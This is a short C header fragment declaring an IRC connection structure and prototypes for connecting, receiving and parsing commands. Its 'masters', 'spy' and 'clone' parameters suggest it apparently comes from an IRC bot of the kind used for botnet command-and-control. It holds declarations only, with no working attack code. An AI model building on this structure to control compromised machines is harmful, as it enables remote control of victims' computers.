// irc/spy structure.
typedef struct IRC 
{
	SOCKET sock;
	char host[128];
	char channel[64];
	char chanpass[64];
	char hchan[64];
	char nick[16];
	unsigned short port;
	int spy;
	int threadnum;
	bool gotinfo;

} IRC;

DWORD WINAPI irc_connect(LPVOID param);
int irc_receiveloop(SOCKET sock, char *channel, char *chanpass, char *nick1, SOCKET hsock, char *hchannel, char *server, int spy);
int IRC_ProtocolParse(char *line, SOCKET sock, char *server, char *channel, char *chanpass, char *nick, char *host, char masters[MAXLOGINS][MAXIDENT], int *in_channel, int repeat, int clone);
int IRC_CommandParse(char *line, char *a[MAXTOKENS], int s, SOCKET sock, char *server, char *channel, char *chanpass, char *nick, char *user, char *host, char masters[MAXLOGINS][128], bool ismaster, int repeat);
